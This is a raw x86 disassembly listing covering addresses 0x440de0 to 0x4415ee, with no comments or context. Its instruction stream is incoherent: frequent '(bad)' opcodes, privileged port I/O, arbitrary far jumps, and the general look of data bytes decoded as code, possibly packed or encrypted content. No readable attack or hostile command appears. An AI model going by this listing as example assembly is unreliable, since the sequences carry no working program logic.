  440de0:	mov    edi,0x7a2dad9e
  440de5:	xor    al,0xea
  440de7:	ss clc 
  440de9:	stc    
  440dea:	sub    DWORD PTR [edx+ebx*1-0x3c],esp
  440dee:	fnop   
  440df0:	mov    BYTE PTR [ebx],0x11
  440df3:	cmp    al,0x86
  440df5:	sar    DWORD PTR [edx-0x770b7393],1
  440dfb:	pop    edx
  440dfc:	shl    DWORD PTR [esi+eax*8+0x17],0x2b
  440e01:	dec    ecx
  440e02:	fnsave [esp+edi*1+0x1c452a28]
  440e09:	nop
  440e0a:	sar    al,0xc0
  440e0d:	ins    BYTE PTR es:[edi],dx
  440e0e:	fst    DWORD PTR [esi+0x35]
  440e11:	rcl    esp,cl
  440e13:	(bad)  
  440e14:	repz mov al,ds:0x7890f489
  440e1a:	aam    0x75
  440e1c:	(bad)  
  440e1d:	gs jge 0x440db4
  440e20:	or     al,0xcf
  440e22:	popa   
  440e23:	add    al,0xf5
  440e25:	stc    
  440e26:	fsub   st,st(0)
  440e28:	add    eax,0xebaa9908
  440e2d:	jge    0x440e06
  440e2f:	and    BYTE PTR [esi],bh
  440e31:	or     bh,BYTE PTR [edx+0x1a]
  440e34:	add    BYTE PTR [esi+0x6281be6c],0x4b
  440e3b:	mov    dl,0xbc
  440e3d:	or     BYTE PTR [edi],ah
  440e3f:	nop
  440e40:	jne    0x440e6a
  440e42:	sub    BYTE PTR [ebp+ecx*4-0x7a],0x56
  440e47:	jno    0x440eb2
  440e49:	cmp    al,0xac
  440e4b:	aaa    
  440e4c:	fist   WORD PTR [eax]
  440e4e:	push   esi
  440e4f:	inc    eax
  440e50:	mov    edi,0x19e325d6
  440e55:	ret    0xfb8a
  440e58:	(bad)  
  440e59:	in     al,dx
  440e5a:	push   cs
  440e5b:	add    DWORD PTR [edx+ecx*8],edx
  440e5e:	mov    BYTE PTR [eax+0x2f],al
  440e61:	retf   0x3478
  440e64:	fisttp WORD PTR [esp+eax*4+0x76]
  440e68:	and    bl,dh
  440e6a:	sub    eax,DWORD PTR [eax]
  440e6c:	inc    esi
  440e6d:	dec    ecx
  440e6e:	dec    ebp
  440e6f:	inc    eax
  440e70:	sbb    ebx,DWORD PTR [esi]
  440e72:	sub    edx,ebp
  440e74:	enter  0xccd4,0xf0
  440e78:	mov    ch,0xb5
  440e7a:	mov    ch,BYTE PTR [ebx]
  440e7c:	pop    esp
  440e7d:	xor    BYTE PTR [edx],bh
  440e7f:	xchg   ebx,eax
  440e80:	fcom   QWORD PTR [ecx-0x5d320cba]
  440e86:	add    edi,eax
  440e88:	mov    ah,0x3c
  440e8a:	mov    cl,0x32
  440e8c:	call   0x1c4d5031
  440e91:	enter  0xfad3,0xf2
  440e95:	and    ebx,ebp
  440e97:	clc    
  440e98:	xchg   BYTE PTR [esp+ebx*4+0x36b2bcb0],dh
  440e9f:	add    BYTE PTR ds:0x411fc79a,cl
  440ea5:	pusha  
  440ea6:	shl    esp,0x7a
  440ea9:	inc    ecx
  440eaa:	daa    
  440eab:	add    BYTE PTR [eax+ebp*4+0x20],dl
  440eaf:	push   esi
  440eb0:	pop    ebp
  440eb1:	bound  ebp,QWORD PTR [esi-0x27]
  440eb4:	mov    ds:0xbf1cb459,al
  440eb9:	mov    esp,0xb6d78490
  440ebe:	xor    DWORD PTR [edx+eax*1+0xb1b6c6c],ebp
  440ec5:	cs dec esp
  440ec7:	mov    WORD PTR [edi+0x6c],es
  440eca:	sbb    ebp,DWORD PTR [eax+0x4bc74c1b]
  440ed0:	ds jae 0x440e82
  440ed3:	(bad)  
  440ed4:	jecxz  0x440f2c
  440ed6:	sub    al,0x31
  440ed8:	dec    eax
  440ed9:	aam    0x4b
  440edb:	dec    eax
  440edc:	(bad)  
  440edd:	push   esp
  440ede:	into   
  440edf:	jmp    0x440e64
  440ee1:	(bad)  
  440ee2:	not    al
  440ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440ee5:	je     0x440f57
  440ee7:	xchg   eax,esp
  440ee9:	test   DWORD PTR [edi+0x64fad31e],0xf6efd690
  440ef3:	jp     0x440f52
  440ef5:	push   eax
  440ef6:	lds    edi,FWORD PTR [edx]
  440ef8:	adc    al,0xe
  440efa:	arpl   WORD PTR [esi],si
  440efc:	mov    esi,0xe8b425a8
  440f01:	push   edx
  440f02:	out    0x3e,al
  440f04:	mov    bh,0x1a
  440f06:	pushf  
  440f07:	js     0x440f36
  440f09:	push   0xffffffb3
  440f0b:	cs dec ebp
  440f0d:	retf   
  440f0e:	cld    
  440f0f:	fadd   st(7),st
  440f11:	ffreep st(6)
  440f13:	addr16 dec ebx
  440f15:	or     bl,BYTE PTR [ecx+0x28594a22]
  440f1b:	push   0x1
  440f1d:	mov    ch,0x34
  440f1f:	or     bh,BYTE PTR [ebp+0xf007062]
  440f25:	fcomp  DWORD PTR [esi-0xf279444]
  440f2b:	add    BYTE PTR [ebx],0x2a
  440f2e:	adc    bl,BYTE PTR [ecx+0x40e2c2ae]
  440f34:	sub    edi,edx
  440f36:	adc    BYTE PTR [edx+0x7e],bh
  440f39:	sbb    BYTE PTR [eax-0x3cf24d87],0xa3
  440f40:	icebp  
  440f41:	shr    BYTE PTR [ecx+edi*2],cl
  440f44:	sbb    BYTE PTR [eax-0x5cde7fb8],0x5b
  440f4b:	inc    esi
  440f4c:	xor    eax,0x917c68c8
  440f51:	pop    edx
  440f52:	lock (bad) 
  440f54:	sti    
  440f55:	sbb    BYTE PTR [eax],dh
  440f57:	or     al,0xf0
  440f59:	mov    cl,BYTE PTR [edx+0x4b]
  440f5c:	sub    DWORD PTR [ebp-0x16],esi
  440f5f:	sbb    eax,esp
  440f61:	test   al,0x8e
  440f63:	add    DWORD PTR [ebp*2+0x3acc17dc],esi
  440f6a:	mov    edx,DWORD PTR [esi+0x655b063e]
  440f70:	test   BYTE PTR [eax+ebx*8+0x321cd653],dl
  440f77:	dec    ecx
  440f78:	jmp    0x3ffe:0x38e7c498
  440f7f:	xchg   esi,eax
  440f80:	jecxz  0x440f15
  440f82:	aad    0x80
  440f84:	fmul   DWORD PTR [esi]
  440f86:	cmp    DWORD PTR [edx],ecx
  440f88:	scas   al,BYTE PTR es:[edi]
  440f89:	nop
  440f8a:	ds or  bl,ch
  440f8d:	adc    BYTE PTR [edi-0x30],al
  440f90:	dec    edx
  440f91:	adc    al,0xb5
  440f93:	lods   al,BYTE PTR ds:[esi]
  440f94:	adc    eax,0x1c575807
  440f99:	jb     0x440f3c
  440f9b:	clc    
  440f9c:	loopne 0x440fa2
  440f9e:	aad    0xda
  440fa0:	scas   eax,DWORD PTR es:[edi]
  440fa1:	sbb    al,0x5f
  440fa3:	jo     0x440fc1
  440fa5:	push   ss
  440fa6:	xor    ecx,0xffffffd8
  440fa9:	rol    dl,1
  440fab:	mul    BYTE PTR [edx+0x4]
  440fae:	cs push ds
  440fb0:	add    BYTE PTR [edx+0x7b],0x44
  440fb4:	loop   0x440f51
  440fb6:	loopne 0x440ffe
  440fb8:	push   esi
  440fb9:	ret    
  440fba:	call   0x5dfb02f2
  440fbf:	pop    edx
  440fc0:	mov    esi,0x9cd27616
  440fc5:	sbb    al,0xd9
  440fc7:	add    BYTE PTR [ebx-0x71c91b77],bl
  440fcd:	mov    eax,ds:0x2468c5b8
  440fd2:	xor    eax,0xc25cb301
  440fd7:	push   eax
  440fd8:	cmp    esi,DWORD PTR [edx]
  440fda:	mov    edx,0x716a797a
  440fdf:	pop    esi
  440fe0:	xchg   edi,eax
  440fe1:	add    BYTE PTR [edi+0x1b],0xd
  440fe5:	xchg   esi,eax
  440fe6:	sub    BYTE PTR [edi+ebp*4-0x2893f74c],bl
  440fed:	mov    BYTE PTR [ecx],0xf4
  440ff0:	lock ins BYTE PTR es:[edi],dx
  440ff2:	or     al,BYTE PTR [edi]
  440ff4:	or     eax,DWORD PTR [esi+0x20f4e126]
  440ffa:	scas   eax,DWORD PTR es:[edi]
  440ffb:	mov    eax,0x2e802d0e
  441000:	ins    BYTE PTR es:[edi],dx
  441001:	mov    ah,0xd
  441003:	enter  0xffe5,0x9a
  441007:	inc    esp
  441008:	mov    esi,0x5d405cd1
  44100d:	xor    dh,0x21
  441010:	jp     0x440fac
  441012:	add    eax,0xa2769097
  441017:	in     eax,dx
  441018:	mov    bh,0x72
  44101a:	mov    edi,0x4cae0b00
  44101f:	adc    eax,0x177b166c
  441024:	mov    ds:0x8a966cb0,al
  441029:	fcmovbe st,st(5)
  44102b:	mov    bh,BYTE PTR [esi]
  44102d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44102e:	sbb    BYTE PTR [esi+0x2916f82c],0xa3
  441035:	ret    0x525e
  441038:	push   es
  441039:	ret    0x70be
  44103c:	data16 fsubr st,st(2)
  44103f:	add    eax,0x8ab842d5
  441044:	or     eax,0xd9e4dff8
  441049:	or     ebp,0x3744d83e
  44104f:	retf   
  441050:	add    al,0x7c
  441052:	or     BYTE PTR [ecx*1+0x6617e3a6],0x7d
  44105a:	xchg   DWORD PTR [esi],eax
  44105c:	mov    ecx,DWORD PTR [edx-0x4c]
  44105f:	(bad)  [edi-0x4bea7d5c]
  441065:	cdq    
  441066:	sbb    al,0x62
  441068:	push   0x46
  44106a:	adc    eax,0x903b634
  44106f:	shl    BYTE PTR [ebx-0x66],1
  441072:	(bad)  
  441073:	sbb    BYTE PTR [ebx+edi*8+0xd],dl
  441077:	cmp    eax,0xb83eea72
  44107c:	loop   0x4410ae
  44107e:	inc    esi
  44107f:	mov    esp,0xd9e2a3a8
  441084:	enter  0x22b4,0x29
  441088:	scas   al,BYTE PTR es:[edi]
  441089:	jecxz  0x44107f
  44108b:	mov    DWORD PTR [esi+0x48],edx
  44108e:	retf   0xfaca
  441091:	sahf   
  441092:	stos   BYTE PTR es:[edi],al
  441093:	aas    
  441094:	iret   
  441095:	xor    bl,BYTE PTR [edx+0x5]
  441098:	inc    esp
  441099:	ins    DWORD PTR es:[edi],dx
  44109a:	cli    
  44109b:	lea    eax,[edx-0x65d5d466]
  4410a1:	ins    DWORD PTR es:[edi],dx
  4410a2:	fs es add eax,0x8e96c45e
  4410a9:	xlat   BYTE PTR ds:[ebx]
  4410aa:	mov    BYTE PTR [ebp+0x6471a7e2],ch
  4410b0:	add    BYTE PTR [edi+ecx*8+0x2a],dl
  4410b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4410b5:	icebp  
  4410b6:	xchg   edx,eax
  4410b7:	push   eax
  4410b8:	mov    ebx,0xc6c17c7a
  4410bd:	add    BYTE PTR [eax-0x49],ah
  4410c0:	cmp    BYTE PTR [edx+0x4],0xc4
  4410c4:	or     bl,BYTE PTR [edx+ecx*4-0x8]
  4410c8:	repnz test BYTE PTR [edi],bh
  4410cb:	outs   dx,BYTE PTR ds:[esi]
  4410cc:	scas   al,BYTE PTR es:[edi]
  4410cd:	outs   dx,BYTE PTR ds:[esi]
  4410ce:	imul   eax,DWORD PTR [esi],0x40
  4410d1:	or     eax,0x222e6950
  4410d6:	movhps xmm2,QWORD PTR [ebx]
  4410d9:	ror    BYTE PTR [edi],cl
  4410db:	bound  edx,QWORD PTR [esi]
  4410dd:	mov    bh,0xa2
  4410df:	clc    
  4410e0:	ret    
  4410e1:	jge    0x441087
  4410e3:	xor    esi,0x70d1a9b6
  4410e9:	cmp    bl,BYTE PTR [ebp+ecx*1-0x3]
  4410ed:	add    esp,esp
  4410ef:	and    DWORD PTR [ebx+0x585fc1f4],ebp
  4410f5:	adc    dl,BYTE PTR [esi]
  4410f7:	adc    al,0x35
  4410f9:	hlt    
  4410fa:	adc    dh,BYTE PTR [eax+ebx*1+0x24]
  4410fe:	xchg   edi,edi
  441100:	loope  0x4410b7
  441102:	lea    eax,[edi-0x4d932a9e]
  441108:	inc    eax
  441109:	fdivrp st(1),st
  44110b:	add    al,0x2b
  44110e:	or     dh,BYTE PTR [edx-0x5a]
  441111:	inc    esi
  441112:	jp     0x44115e
  441114:	das    
  441115:	dec    ebp
  441116:	jge    0x44113a
  441118:	js     0x441101
  44111a:	cmc    
  44111b:	(bad)  
  44111c:	cmc    
  44111d:	(bad)  
  44111e:	push   esi
  44111f:	rcr    DWORD PTR [edx+0x5b],1
  441122:	dec    edx
  441123:	ror    BYTE PTR [eax+0x71b9765],0xa6
  44112a:	adc    bl,BYTE PTR ds:0x45139858
  441130:	fwait
  441131:	push   0x409e622a
  441136:	iret   
  441137:	dec    ebx
  441138:	and    BYTE PTR [ebx+0x2bd05f88],ah
  44113e:	adc    BYTE PTR [ebx-0x75581b0f],cl
  441144:	dec    esp
  441145:	add    ebx,ebx
  441147:	add    esp,esp
  441149:	clc    
  44114a:	mov    BYTE PTR [ecx-0x4d],ah
  44114d:	mov    ah,0x5d
  44114f:	dec    eax
  441150:	js     0x441196
  441152:	fbstp  TBYTE PTR [esi-0x5d05d362]
  441158:	mov    al,0xa8
  44115a:	push   esi
  44115b:	mov    ebx,0xacd69614
  441160:	pushf  
  441161:	jl     0x44119e
  441163:	lods   eax,DWORD PTR ds:[esi]
  441164:	adc    eax,0x4ba68f0d
  441169:	push   cs
  44116a:	add    dl,dh
  44116c:	xor    ch,cl
  44116e:	(bad)  
  44116f:	outs   dx,DWORD PTR ds:[esi]
  441170:	jecxz  0x441193
  441172:	sbb    al,0x99
  441174:	pusha  
  441175:	es pop edi
  441177:	int3   
  441178:	mov    esp,0xf81f8426
  44117d:	in     eax,dx
  44117e:	sub    eax,0x5c6ec86
  441183:	loop   0x441118
  441185:	add    eax,0x1e23b39a
  44118a:	fcmovnu st,st(0)
  44118c:	cmc    
  44118d:	xchg   esi,eax
  44118e:	aam    0x6e
  441190:	push   cs
  441191:	mov    DWORD PTR [eax+0x7355257c],edx
  441197:	mov    ebp,0xcf0d6014
  44119c:	push   esi
  44119d:	les    esp,FWORD PTR [edx+edx*1-0x7b]
  4411a1:	add    BYTE PTR [edx+0x41],bl
  4411a4:	jle    0x44121e
  4411a6:	xlat   BYTE PTR ds:[ebx]
  4411a7:	call   0x3d2:0x579b523d
  4411ae:	sbb    bh,BYTE PTR [eax-0x34210947]
  4411b4:	mov    edx,0x52b50d2e
  4411b9:	cs nop
  4411bb:	fadd   QWORD PTR [ebx+0x62]
  4411be:	adc    edi,DWORD PTR [esi+0x4a]
  4411c1:	fcom   st(4)
  4411c3:	cmp    dh,bh
  4411c5:	pop    eax
  4411c6:	mov    eax,0xfa57dad2
  4411cb:	xchg   DWORD PTR [edi+edx*4-0x722f5d7e],ecx
  4411d2:	ds and al,0x31
  4411d5:	loopne 0x441199
  4411d7:	sub    BYTE PTR [edx+0x5450f4d4],cl
  4411dd:	aaa    
  4411de:	mov    ?,WORD PTR [edi-0x5ebb1d00]
  4411e4:	enter  0x2478,0x30
  4411e8:	fist   DWORD PTR [esi]
  4411ea:	and    al,0x9
  4411ec:	out    0x4d,al
  4411ee:	ins    DWORD PTR es:[edi],dx
  4411ef:	pushf  
  4411f0:	ror    BYTE PTR [edx],1
  4411f2:	add    BYTE PTR [eax+0x68],dh
  4411f5:	shl    BYTE PTR [ebx+0x2a184aad],0xca
  4411fc:	(bad)  
  4411fd:	or     DWORD PTR [ebx-0x5e],eax
  441200:	mov    BYTE PTR [edx],ch
  441202:	jbe    0x441192
  441204:	std    
  441205:	test   BYTE PTR [eax+eiz*4-0x1c3d286],dh
  44120c:	dec    eax
  44120d:	push   eax
  44120e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441210:	jl     0x44119a
  441212:	jp     0x44127d
  441214:	jb     0x4411e5
  441216:	cdq    
  441217:	push   esi
  441218:	pop    eax
  441219:	lea    esp,[edx+0x4b]
  44121c:	and    al,ch
  44121e:	add    al,0xad
  441220:	xchg   esi,eax
  441221:	or     cl,BYTE PTR [esp+edi*4+0x14]
  441225:	mov    al,ds:0x4b6b8e34
  44122a:	add    eax,0x59f23db8
  44122f:	and    al,0x2f
  441231:	pusha  
  441232:	sub    eax,0x245e7ab8
  441237:	imul   esi,DWORD PTR [edi-0xa],0xffffffab
  44123b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  44123d:	sub    BYTE PTR [edi+0x1],0xe6
  441241:	mov    dl,0x72
  441243:	popf   
  441244:	loopne 0x4411c9
  441246:	push   esp
  441247:	mov    bh,0x84
  441249:	add    BYTE PTR [edx-0xd],ch
  44124c:	sbb    eax,edi
  44124e:	xchg   edx,eax
  44124f:	mov    cl,0x90
  441251:	add    DWORD PTR [esp+esi*1+0x7f],esp
  441255:	sub    al,0xa9
  441257:	mov    ds:0x2ea56815,al
  44125c:	popa   
  44125d:	sbb    BYTE PTR [esi+0x78d0e322],0x60
  441264:	shl    BYTE PTR [edx+0xc],0x38
  441268:	call   0x5c4b64d
  44126d:	rcr    BYTE PTR [edi+0x3c],0x4a
  441271:	xor    DWORD PTR [ecx],edx
  441273:	push   edx
  441274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441275:	jno    0x441298
  441277:	jmp    0xe9ad:0x41524ed6
  44127e:	sar    DWORD PTR [edx+ebx*8],0xdc
  441282:	jbe    0x44128e
  441284:	retf   
  441285:	test   BYTE PTR [edi+0x50],ah
  441288:	add    edi,DWORD PTR [edx]
  44128a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44128b:	add    eax,DWORD PTR [esi-0x1d6abb7a]
  441291:	stos   BYTE PTR es:[edi],al
  441292:	mov    BYTE PTR [ecx],bl
  441294:	xor    BYTE PTR [ebx+0x3b94215],dh
  44129a:	jo     0x44125a
  44129c:	dec    eax
  44129d:	sbb    BYTE PTR [eax+eax*8],ah
  4412a0:	add    ebp,edx
  4412a2:	scas   eax,DWORD PTR es:[edi]
  4412a3:	pop    ds
  4412a4:	mov    dl,0xd4
  4412a6:	xchg   esp,eax
  4412a7:	test   BYTE PTR [edx-0x75a54bfa],al
  4412ad:	or     cl,dh
  4412af:	pop    eax
  4412b0:	pop    ebx
  4412b1:	jnp    0x4412c9
  4412b3:	adc    DWORD PTR [eax+esi*8+0x70],ecx
  4412b7:	(bad)  
  4412b8:	sbb    eax,DWORD PTR [eax]
  4412ba:	dec    ecx
  4412bb:	push   ss
  4412bc:	and    esp,DWORD PTR [ecx-0x5]
  4412bf:	nop
  4412c0:	mov    esi,?
  4412c2:	dec    esp
  4412c3:	ja     0x44124f
  4412c5:	ins    BYTE PTR es:[edi],dx
  4412c6:	mov    DWORD PTR [eax],0x98cda0d0
  4412cc:	adc    ah,bl
  4412ce:	add    al,0x91
  4412d0:	(bad)  
  4412d1:	xor    DWORD PTR [ebp-0x27372b16],esp
  4412d7:	jbe    0x441305
  4412d9:	mov    ds:0x135070c4,eax
  4412de:	jo     0x441355
  4412e0:	fadd   QWORD PTR ss:[edi-0x19de45cc]
  4412e7:	inc    edx
  4412e8:	ds xchg esp,eax
  4412ea:	add    BYTE PTR [edi+0x108eb405],ch
  4412f0:	push   0x3c7f5366
  4412f5:	sar    eax,1
  4412f7:	or     DWORD PTR [edx-0x3b6730f4],edx
  4412fd:	mov    ch,0x42
  4412ff:	cmp    DWORD PTR [ebp-0xc],eax
  441302:	out    dx,al
  441303:	int3   
  441304:	and    BYTE PTR [esi+0xb],0x0
  441308:	lahf   
  441309:	popa   
  44130a:	sbb    al,0x52
  44130c:	push   0x619805d0
  441311:	fsub   DWORD PTR [ecx+0x50e6d6bd]
  441317:	sti    
  441318:	mov    ah,0x9a
  44131a:	retf   0x266d
  44131d:	jle    0x441371
  44131f:	stos   BYTE PTR es:[edi],al
  441320:	adc    ecx,DWORD PTR [edx]
  441322:	call   0x85ba:0xeba682c4
  441329:	mov    dh,0x5e
  44132b:	pop    ebx
  44132c:	rol    BYTE PTR [esi],0x6e
  44132f:	push   ebp
  441330:	(bad)
  441333:	pop    ss
  441334:	push   0xd
  441336:	lahf   
  441337:	add    dl,BYTE PTR [eax-0x599f2bfa]
  44133d:	dec    edx
  44133e:	push   ds
  44133f:	and    eax,0x12046aec
  441344:	dec    edx
  441345:	pop    eax
  441346:	xchg   edi,eax
  441347:	cmp    cl,dh
  441349:	push   0x12
  44134b:	xchg   esp,eax
  44134c:	mov    al,ds:0x663c2da
  441351:	jne    0x4413ad
  441353:	and    eax,0xd9516ce0
  441358:	push   0x40
  44135a:	test   al,0x98
  44135c:	js     0x44139c
  44135e:	enter  0x8e4e,0x42
  441362:	stos   BYTE PTR es:[edi],al
  441363:	mov    ch,0x76
  441365:	dec    eax
  441366:	inc    ebx
  441367:	push   ss
  441368:	mov    dl,0xac
  44136a:	gs or  bh,bl
  44136d:	not    BYTE PTR [esi]
  44136f:	in     al,dx
  441370:	adc    DWORD PTR [eax+0x3b1dbec5],esp
  441376:	fs mov dh,0x3d
  441379:	sbb    BYTE PTR [eax+0x7e],ch
  44137c:	ror    BYTE PTR [eax],1
  44137e:	pop    es
  44137f:	call   0xad2e:0x1abe388f
  441386:	or     eax,0x5443a3e6
  44138b:	and    al,0x8
  44138d:	xchg   ebp,eax
  44138e:	cvtps2pd xmm2,xmm5
  441391:	and    al,0xb4
  441394:	(bad)  
  441395:	mov    dl,0xf1
  441397:	add    esi,edx
  441399:	sahf   
  44139a:	je     0x441400
  44139c:	idiv   BYTE PTR [edi-0x456d64eb]
  4413a2:	and    al,0x42
  4413a4:	sub    ah,bl
  4413a6:	and    bh,BYTE PTR [esi+0x34]
  4413a9:	mov    WORD PTR es:[ebp+ebp*8-0x29257ff7],fs
  4413b1:	pop    ds
  4413b2:	jg     0x4413a6
  4413b4:	add    dl,dl
  4413b6:	adc    dl,BYTE PTR [edx]
  4413b8:	hlt    
  4413b9:	or     al,0xa0
  4413bb:	pop    DWORD PTR [eax+esi*4+0x6a62c128]
  4413c2:	cli    
  4413c3:	inc    esi
  4413c4:	(bad)  
  4413c5:	sbb    DWORD PTR [bx+0x132e],ebp
  4413ca:	inc    ebx
  4413cb:	adc    BYTE PTR [ebx+0x58],bl
  4413ce:	add    DWORD PTR [edi],ebp
  4413d0:	fs jl  0x44139f
  4413d3:	inc    eax
  4413d4:	loop   0x4413c0
  4413d6:	mov    ecx,0xfa901e15
  4413db:	or     dh,dh
  4413dd:	push   ebx
  4413de:	ins    BYTE PTR es:[edi],dx
  4413df:	retf   0xe3e5
  4413e2:	dec    eax
  4413e3:	js     0x441397
  4413e5:	or     ch,BYTE PTR [esi-0x7dd5b07]
  4413eb:	and    DWORD PTR [ecx+0x67],ebp
  4413ee:	jmp    0xc6108d1c
  4413f3:	and    BYTE PTR ds:0x8402d655,al
  4413f9:	sub    BYTE PTR [eax],0x18
  4413fc:	es add al,al
  4413ff:	add    esi,DWORD PTR [ebp-0x39cfe313]
  441405:	and    DWORD PTR [ebp+ecx*2-0x4d1eea5f],edx
  44140c:	dec    edx
  44140d:	dec    esi
  44140e:	sub    DWORD PTR [eax],edx
  441410:	or     al,0x48
  441412:	call   0x50450c2a
  441417:	lods   al,BYTE PTR ds:[esi]
  441418:	(bad)  
  441419:	xchg   edi,eax
  44141a:	test   DWORD PTR [eax],edi
  44141c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44141d:	rcr    BYTE PTR [ecx+edx*1-0x273d564c],1
  441424:	cmp    eax,DWORD PTR [edx]
  441426:	lock sbb DWORD PTR [esi+eiz*2+0x52387a91],ebx
  44142e:	sbb    BYTE PTR [esi+0x18],dl
  441431:	mov    al,ds:0x4e3252ae
  441436:	or     BYTE PTR [ecx+0x187684cf],al
  44143c:	or     al,0xda
  44143e:	mov    esp,0x52926332
  441443:	cli    
  441444:	add    al,0x9c
  441446:	xchg   DWORD PTR [esi],esp
  441448:	bound  esp,QWORD PTR [ebp-0x5e]
  44144b:	xchg   edx,eax
  44144c:	call   0xd044fc8a
  441451:	mov    dh,0x2
  441453:	mov    edx,0x416be82e
  441458:	inc    esi
  441459:	rcl    BYTE PTR ds:0x987d640f,0xfd
  441460:	rcl    DWORD PTR [esi],0xf7
  441463:	(bad)  
  441464:	call   0x7e59:0x1d1534c7
  44146b:	pop    ebp
  44146c:	ds push ebx
  44146e:	pop    esi
  44146f:	sub    eax,0x568487b5
  441474:	sub    BYTE PTR [esi-0x23],dh
  441477:	mov    eax,0xb34bb3c
  44147c:	push   eax
  44147d:	lea    ebp,[ecx+eiz*4]
  441480:	retf   0xace5
  441483:	sub    al,0xa
  441485:	add    DWORD PTR [ebp-0x38],edi
  441488:	jp     0x441441
  44148a:	mov    ah,0x63
  44148c:	adc    BYTE PTR [edi+edx*8-0x4d],dl
  441490:	mov    al,0x54
  441492:	add    ch,dl
  441494:	mov    eax,ds:0xdcadcd80
  441499:	mov    DWORD PTR [eax-0xa],0x8f290800
  4414a0:	fcomp  DWORD PTR [edx]
  4414a2:	scas   eax,DWORD PTR es:[edi]
  4414a3:	sub    al,0xe0
  4414a5:	in     eax,0x54
  4414a7:	scas   al,BYTE PTR es:[edi]
  4414a8:	sar    DWORD PTR ss:0xd6447a12,1
  4414af:	je     0x44143b
  4414b1:	mov    BYTE PTR [ecx+0x544c8a02],0x6c
  4414b8:	cmp    bl,BYTE PTR [eax]
  4414ba:	shr    BYTE PTR [ebp+0xe],0x2
  4414be:	pop    edi
  4414bf:	lods   al,BYTE PTR ds:[esi]
  4414c0:	scas   eax,DWORD PTR es:[edi]
  4414c1:	shl    BYTE PTR [eax+0x97e53d0],1
  4414c7:	mov    edi,0x1c0c7e09
  4414cc:	gs pop cx
  4414cf:	add    BYTE PTR [esp+esi*1-0x30],bh
  4414d3:	jl     0x4414db
  4414d5:	scas   al,BYTE PTR es:[edi]
  4414d6:	ds ret 
  4414d8:	or     edx,DWORD PTR [edx+0x3b]
  4414db:	sub    al,0x59
  4414dd:	jb     0x4414da
  4414df:	pop    es
  4414e0:	bound  esp,QWORD PTR [ecx]
  4414e2:	pop    eax
  4414e3:	mov    eax,ds:0x35ee7fa4
  4414e8:	inc    eax
  4414e9:	adc    DWORD PTR [edi],edx
  4414eb:	or     cl,BYTE PTR es:[edx+0x449d8094]
  4414f2:	mov    al,ds:0x44b89213
  4414f7:	test   al,0xb6
  4414f9:	add    edx,DWORD PTR [edx]
  4414fb:	mov    edi,0x68a822e4
  441500:	aam    0x4c
  441502:	xchg   edi,eax
  441503:	scas   eax,DWORD PTR es:[edi]
  441504:	mov    edi,DWORD PTR [edx-0x78412bec]
  44150a:	jb     0x4414fa
  44150c:	add    eax,edi
  44150e:	inc    ebp
  44150f:	je     0x44153d
  441511:	pop    esp
  441512:	mov    esp,0x95504db0
  441517:	lods   al,BYTE PTR ds:[esi]
  441518:	imul   ebp,DWORD PTR [esi],0x5c
  44151b:	inc    eax
  44151c:	shl    BYTE PTR [esi+esi*4-0x363bbc20],cl
  441523:	nop
  441524:	pop    ecx
  441525:	jb     0x44159d
  441527:	cmp    esp,DWORD PTR [esi+0x5cbf4303]
  44152d:	mov    DWORD PTR [eax],esp
  44152f:	out    0x36,al
  441531:	fsubr  QWORD PTR [esi+eax*4+0x16]
  441535:	(bad)  
  441536:	inc    cl
  441538:	(bad)  
  441539:	adc    dh,al
  44153b:	push   cs
  44153c:	arpl   WORD PTR [eax],cx
  44153e:	js     0x441580
  441540:	sub    dh,BYTE PTR [ebp-0x50]
  441543:	dec    eax
  441544:	or     BYTE PTR ss:[edi-0x7749af3e],0x96
  44154c:	xchg   ebx,eax
  44154d:	dec    ebp
  44154e:	adc    eax,0x13d6fda0
  441553:	mov    es,WORD PTR [esi-0x64]
  441556:	sbb    al,0x3
  441558:	dec    edx
  441559:	push   0xffffffbb
  44155b:	cs aam 0x97
  44155e:	push   cs
  44155f:	mov    dl,0xb3
  441561:	cs jne 0x441564
  441564:	pop    edi
  441565:	test   BYTE PTR [esi+0x3a],bh
  441568:	inc    ecx
  441569:	ret    0x45ce
  44156c:	add    DWORD PTR [edi+0x2],0xffffffb0
  441570:	push   edx
  441571:	sbb    al,0x12
  441573:	pop    esp
  441574:	jp     0x441564
  441576:	adc    esp,DWORD PTR [esp+esi*8]
  441579:	dec    ebp
  44157a:	popa   
  44157b:	xor    edx,DWORD PTR [edi]
  44157d:	push   ds
  44157e:	pop    edx
  44157f:	add    eax,0xd0e8c1f0
  441584:	sbb    ch,BYTE PTR [esi]
  441586:	fnstcw WORD PTR [esi-0x46]
  441589:	push   ss
  44158a:	mov    ch,0x43
  44158c:	jmp    0x142658bd
  441591:	(bad)  
  441592:	neg    dl
  441594:	ror    DWORD PTR [edi],0xa9
  441597:	inc    ebp
  441598:	lahf   
  441599:	add    bh,BYTE PTR [edx+0x661bd4fc]
  44159f:	sub    BYTE PTR [edi],0x9
  4415a2:	aas    
  4415a3:	add    BYTE PTR [ebp+ecx*8+0x76ce542],bh
  4415aa:	loop   0x4415cf
  4415ac:	sbb    al,0xac
  4415ae:	pop    esi
  4415af:	xor    al,0xee
  4415b1:	(bad)  
  4415b2:	adc    edx,esi
  4415b4:	push   0xd0a0b8b5
  4415b9:	les    esp,FWORD PTR [edx+0x691e3b5e]
  4415bf:	je     0x44155d
  4415c1:	cmp    edx,DWORD PTR [esi]
  4415c3:	push   ss
  4415c4:	push   es
  4415c5:	ss ds sbb eax,0x801b67b5
  4415cc:	mov    al,ds:0x6750969a
  4415d1:	popa   
  4415d2:	pusha  
  4415d3:	push   edi
  4415d4:	xchg   DWORD PTR [eax+0x3a9ef4de],ecx
  4415da:	mov    eax,edx
  4415dc:	and    al,0x23
  4415de:	hlt    
  4415df:	pushf  
  4415e0:	shr    al,0x64
  4415e3:	inc    edi
  4415e4:	and    dl,BYTE PTR [eax+0x60]
  4415e7:	inc    eax
  4415e8:	fisub  WORD PTR [esi-0x1d]
  4415eb:	and    cl,ch
  4415ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4415ee:	test   al,0xe8
